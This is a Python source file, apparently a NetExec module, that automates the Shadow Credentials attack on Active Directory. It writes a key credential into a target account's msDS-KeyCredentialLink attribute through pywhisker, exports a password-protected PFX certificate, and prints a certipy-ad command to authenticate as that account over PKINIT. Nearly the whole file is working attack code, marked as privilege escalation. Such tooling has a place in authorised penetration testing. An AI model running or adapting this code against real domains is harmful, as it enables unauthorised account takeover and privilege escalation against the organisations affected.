# shadow_creds.py — NXC module for Shadow Credentials / PKINIT abuse
# adds a key credential to msDS-KeyCredentialLink, grabs a PFX, done
#
# author: @SoftAndoWetto
# usage:  nxc ldap <dc> -u <user> -p <pass> -M shadow-creds -o TARGET=<samname>

from nxc.helpers.misc import CATEGORY
from nxc.paths import TMP_PATH
from datetime import datetime
from pathlib import Path
from types import SimpleNamespace
import secrets
import string

from pywhisker.pywhisker import ShadowCredentials, init_ldap_session
import impacket.ldap.ldap as ldap_impacket


# impacket doesn't accept a 'signing' kwarg in newer builds — patch it out
if not getattr(ldap_impacket.LDAPConnection, "_nxc_patched", False):
    _orig_init = ldap_impacket.LDAPConnection.__init__

    def _patched_init(self, *args, **kwargs):
        kwargs.pop("signing", None)
        return _orig_init(self, *args, **kwargs)

    ldap_impacket.LDAPConnection.__init__ = _patched_init
    ldap_impacket.LDAPConnection._nxc_patched = True


# thin wrapper so pywhisker log calls go through nxc's logger
# verbosity=0 by default to keep noise down
class _PywLoggerAdapter:
    def __init__(self, context, verbosity=0):
        self.context = context
        self.verbosity = verbosity
        self.perm_denied = False
        self.not_found = False

        self._denied_patterns = ("insuff_access_rights", "00002098")
        # pywhisker raises "does not exist" both via logger.error and as an exception
        self._notfound_patterns = ("user not found", "does not exist")

    def info(self, msg):
        self.context.log.info(msg)

    def success(self, msg):
        self.context.log.success(msg)

    def verbose(self, msg):
        if self.verbosity >= 2:
            self.context.log.info(msg)

    def debug(self, msg):
        if self.verbosity >= 1:
            self.context.log.debug(msg)

    # pywhisker calls warning() in some paths — prevent AttributeError
    def warning(self, msg):
        self.context.log.highlight(msg)

    def error(self, msg):
        txt = str(msg).lower()

        # Treat PFX creation failure as permission/ACL failure
        if any(p in txt for p in (
            "insuff_access_rights",
            "00002098",
            "failed to create pfx",
            "access is denied",
            "constraint violation"
        )):
            self.perm_denied = True
            if self.verbosity >= 2:
                self.context.log.debug(str(msg))
            return

        if any(p in txt for p in self._notfound_patterns):
            self.not_found = True
            if self.verbosity >= 2:
                self.context.log.debug(str(msg))
            return

        self.context.log.error(msg)


class NXCModule:
    name = "shadow-creds"
    description = "Shadow Credentials attack - add key credential for PKINIT authentication"
    supported_protocols = ["ldap"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    def __init__(self):
        self.domain = None
        self.dc_ip = None
        self.username = None
        self.password = None
        self.nthash = None

        self.target = None
        self.pfx_pass = None
        self.out_dir = None

    def options(self, context, module_options):
        self.target = module_options.get("TARGET")
        if not self.target:
            context.log.fail("TARGET is required")
            return

        self.pfx_pass = module_options.get("PFXPASS")

        ts = datetime.now().strftime("%Y%m%d-%H%M%S")
        default = Path(TMP_PATH) / f"shadow-creds-{self.target}-{ts}"
        self.out_dir = Path(module_options.get("OUTDIR") or default).resolve()

        return {
            "TARGET": self.target,
            "PFXPASS": "<auto>" if not self.pfx_pass else "<provided>",
            "OUTDIR": str(self.out_dir),
        }

    def _gather_conn_info(self, connection):
        self.domain = getattr(connection, "domain", None)
        self.dc_ip = getattr(connection, "dc_ip", None) or getattr(connection, "host", None)
        self.username = getattr(connection, "username", None)
        self.password = getattr(connection, "password", None)
        self.nthash = getattr(connection, "nthash", None)

    def _get_ldap_session(self):
        args = SimpleNamespace(
            dc_ip=self.dc_ip,
            dc_host=None,
            use_ldaps=False,
            use_schannel=False,
            use_kerberos=False,
            auth_hashes=None,
            auth_key=None,
            crt=None,
            key=None,
        )

        password = self.password or ""
        lmhash = ""
        nthash = (self.nthash or "").lower()

        # hash auth — split LM:NT if needed, pass auth_hashes so pywhisker knows to use it
        if nthash:
            if ":" in nthash:
                lmhash, _, nt_only = nthash.partition(":")
                lmhash = lmhash or ""
                nthash = nt_only
            args.auth_hashes = f"{lmhash}:{nthash}"
            password = ""

        srv, sess = init_ldap_session(
            args,
            self.domain,
            self.username,
            password,
            lmhash,
            nthash
        )

        return srv, sess

    def _run_shadow_flow(self, context, connection):
        ldap_server, ldap_session = self._get_ldap_session()
        logger = _PywLoggerAdapter(context)

        self.out_dir.mkdir(parents=True, exist_ok=True)

        if not self.pfx_pass:
            self.pfx_pass = "".join(
                secrets.choice(string.ascii_letters + string.digits)
                for _ in range(24)
            )

        base_path = str(self.out_dir / self.target)

        sc = ShadowCredentials(
            ldap_server,
            ldap_session,
            target_samname=self.target,
            target_domain=self.domain,
            logger=logger
        )

        try:
            result = sc.add(
                password=self.pfx_pass,
                path=base_path,
                export_type="PFX",
                domain=self.domain,
                target_domain=self.domain
            )

            # pywhisker may fail silently and return False
            if result is False:
                context.log.fail(
                    f"Access denied: '{self.username}' does not have rights over '{self.target}' "
                    f"(msDS-KeyCredentialLink modification not permitted)"
                )
                return

        except Exception as e:
            txt = str(e).lower()

            if any(p in txt for p in (
                "insuff_access_rights",
                "00002098",
                "failed to create pfx",
                "access is denied"
            )):
                context.log.fail(
                    f"Access denied: '{self.username}' cannot modify '{self.target}' "
                    f"(insufficient rights on msDS-KeyCredentialLink)"
                )
                return

            if any(p in txt for p in logger._notfound_patterns):
                context.log.fail(f"Target '{self.target}' not found — check the sAMAccountName and domain")
                return

            context.log.error(f"Attack failed: {e}")
            return

        # check logger flags first — pywhisker sometimes returns without raising
        if logger.not_found:
            context.log.fail(f"Target '{self.target}' not found — check the sAMAccountName and domain")
            return

        if logger.perm_denied:
            context.log.fail(f"Access denied on msDS-KeyCredentialLink for '{self.target}' — need GenericWrite or equivalent")
            return

        # check exact path first, fall back to glob in case pywhisker appended its own suffix
        pfx_path = Path(base_path + ".pfx")
        if logger.perm_denied:
            context.log.fail(
                f"Access denied: no PFX was created for '{self.target}' "
                f"(insufficient privileges on msDS-KeyCredentialLink)"
            )
            return

        final_path = pfx_path if pfx_path.exists() else None

        if final_path:
            context.log.success("=" * 60)
            context.log.success("SHADOW CREDENTIALS SUCCESS!")
            context.log.success("=" * 60)
            context.log.success(f"Target: {self.target}")
            context.log.success(f"PFX: {final_path}")
            context.log.success(f"Password: {self.pfx_pass}")
            context.log.success("=" * 60)
            context.log.info(f"certipy-ad auth -pfx '{final_path}' -password '{self.pfx_pass}'")
        else:
            context.log.fail(f"PFX not found after add — check {self.out_dir} manually")

    def on_login(self, context, connection):
        if not self.target or not self.out_dir:
            return
        try:
            self._gather_conn_info(connection)
            self._run_shadow_flow(context, connection)
        except Exception as e:
            context.log.error(f"Module failed: {e}")
